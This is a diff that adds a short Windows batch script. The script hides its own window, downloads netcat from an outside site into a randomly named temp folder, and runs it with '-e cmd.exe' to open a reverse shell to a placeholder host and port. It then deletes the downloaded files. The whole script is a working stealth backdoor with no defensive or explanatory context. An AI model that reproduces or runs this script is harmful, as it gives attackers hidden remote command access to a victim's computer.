@@ -1,0 +1,22 @@
+@echo off
+
+:: Hide script execution window
+if not "%1"=="h" start /min cmd /c "%~dpnx0" h & exit /b
+
+:: Create a random directory name to download netcat
+set "DIRNAME=%TEMP%\%RANDOM%-%RANDOM%"
+md "%DIRNAME%"
+
+:: Replace "YOUR_HOST" and "YOUR_PORT" with your desired host and port
+set "HOST=YOUR_HOST"
+set "PORT=YOUR_PORT"
+
+:: Download and execute netcat
+powershell -c "Invoke-WebRequest -Uri 'https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip' -OutFile '%DIRNAME%\nc.zip'; Expand-Archive -Path '%DIRNAME%\nc.zip' -DestinationPath '%DIRNAME%'"
+
+:: Execute netcat to create a reverse shell
+start /min "%DIRNAME%\nc.exe" -e cmd.exe %HOST% %PORT%
+
+:: Clean up - delete downloaded files
+ping localhost -n 3 > nul
+rd /s /q "%DIRNAME%"
